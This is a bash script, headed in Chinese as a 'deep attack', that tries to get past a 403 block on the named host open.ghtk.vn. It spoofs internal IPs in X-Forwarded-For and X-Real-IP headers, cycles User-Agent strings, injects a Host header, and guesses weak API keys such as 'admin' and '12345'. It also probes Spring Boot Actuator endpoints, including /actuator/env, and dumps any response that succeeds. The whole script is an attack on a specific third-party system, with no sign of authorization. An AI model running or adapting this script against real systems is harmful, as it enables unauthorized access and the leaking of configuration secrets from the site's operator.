#!/bin/bash
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🔥 深度攻击：open.ghtk.vn 403绕过"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

TARGET="open.ghtk.vn"

echo "[*] 测试1：IP白名单绕过"
INTERNAL_IPS=("127.0.0.1" "localhost" "10.0.0.1" "192.168.1.1" "103.188.250.130")
for ip in "${INTERNAL_IPS[@]}"; do
    echo -n "  X-Forwarded-For: $ip → "
    curl -sk "https://$TARGET/api" -H "X-Forwarded-For: $ip" -H "X-Real-IP: $ip" -w "%{http_code}" -o /dev/null -m 3
    echo ""
done

echo ""
echo "[*] 测试2：User-Agent绕过"
UAS=("Googlebot/2.1" "curl/7.64.0" "Java/1.8.0" "okhttp/4.9.0")
for ua in "${UAS[@]}"; do
    echo -n "  UA: $ua → "
    curl -sk "https://$TARGET/api" -H "User-Agent: $ua" -w "%{http_code}" -o /dev/null -m 3
    echo ""
done

echo ""
echo "[*] 测试3：Host头注入"
curl -sk "https://$TARGET/api" -H "Host: localhost" -I -m 3 | head -10

echo ""
echo "[*] 测试4：API Key认证"
API_KEYS=("test" "admin" "ghtk" "api_key" "12345")
for key in "${API_KEYS[@]}"; do
    echo -n "  X-API-Key: $key → "
    curl -sk "https://$TARGET/api" -H "X-API-Key: $key" -w "%{http_code}" -o /dev/null -m 3
    echo ""
done

echo ""
echo "[*] 测试5：直接访问Spring Boot Actuator"
ACTUATOR_PATHS=(
    "/actuator"
    "/actuator/env"
    "/actuator/health"
    "/actuator/metrics"
    "/actuator/mappings"
    "/actuator/beans"
    "/actuator/configprops"
)

for path in "${ACTUATOR_PATHS[@]}"; do
    echo -n "  $path → "
    status=$(curl -sk "https://$TARGET$path" -H "X-Forwarded-For: 127.0.0.1" -w "%{http_code}" -o /tmp/actuator_resp -m 3 2>/dev/null)
    echo "$status"
    [ "$status" == "200" ] && cat /tmp/actuator_resp | jq . 2>/dev/null | head -20
done

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
